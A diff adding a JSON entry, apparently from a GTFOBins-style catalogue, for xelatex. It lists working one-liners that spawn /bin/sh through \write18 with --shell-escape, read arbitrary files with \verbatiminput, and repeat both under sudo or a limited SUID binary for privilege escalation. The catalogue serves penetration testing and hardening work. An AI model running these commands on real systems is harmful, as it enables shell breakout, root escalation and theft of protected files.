@@ -1,0 +1,29 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "code": "xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
+      }
+    ],
+    "file-read": [
+      {
+        "description": "The read file will be part of the output.",
+        "code": "xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{[file]}\\end{document}'\nstrings article.dvi\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "The read file will be part of the output.",
+        "code": "sudo xelatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{[file]}\\end{document}'\nstrings article.dvi\n"
+      },
+      {
+        "code": "sudo xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
+      }
+    ],
+    "limited-suid": [
+      {
+        "code": "./xelatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'\n"
+      }
+    ]
+  }
+}
